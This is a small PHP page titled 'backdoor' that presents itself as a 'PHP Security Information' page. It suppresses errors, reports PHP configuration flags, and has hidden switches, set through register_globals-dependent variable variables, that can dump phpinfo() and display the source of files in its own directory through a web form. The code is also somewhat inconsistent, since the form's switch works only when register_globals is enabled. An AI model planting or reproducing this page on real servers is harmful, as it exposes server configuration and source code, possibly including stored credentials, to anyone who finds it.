<?php

error_reporting(0);

$safe_mode = ini_get('safe_mode') ? "On" : "Off";
$register_globals = ini_get('register_globals') ? "On" : "Off";
$magic_quotes_gpc = ini_get('magic_quotes_gpc') ? "On" : "Off";

$lang = "en";
$txt['en']['on'] = "on";
$txt['en']['off'] = "off";

$ArrFuncs = array(
    "showsource" => 0, 
    "phpinfo" => 0,    
);

foreach ($ArrFuncs as $key => $val) {
    if (!isset($$key)) {
        $$key = $val;
    }
}

function safe_input($data) {
    return htmlspecialchars(stripslashes(trim($data)), ENT_QUOTES, 'UTF-8');
}

if ($phpinfo == 1) {
    phpinfo();
}

function show_source_file($file) {
    if (!file_exists($file)) {
        echo "Error: File not found!";
        return;
    }
    if (strpos(realpath($file), realpath(__DIR__)) !== 0) {
        echo "Error: Access denied!";
        return;
    }
    highlight_file($file);
}

if ($showsource == 1 && isset($_GET['file'])) {
    $file = safe_input($_GET['file']);
    show_source_file($file);
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>backdoor</title>
</head>
<body>
    <h2>PHP Security Information</h2>
    <p>PHP Version: <?php echo phpversion(); ?></p>
    <p>Safe Mode: <?php echo $safe_mode; ?></p>
    <p>Register Globals: <?php echo $register_globals; ?></p>
    <p>Magic Quotes GPC: <?php echo $magic_quotes_gpc; ?></p>
    
    <h3>View Source Code</h3>
    <form method="GET">
        <input type="text" name="file" placeholder="Enter filename">
        <input type="hidden" name="showsource" value="1">
        <button type="submit">View</button>
    </form>

</body>
</html>
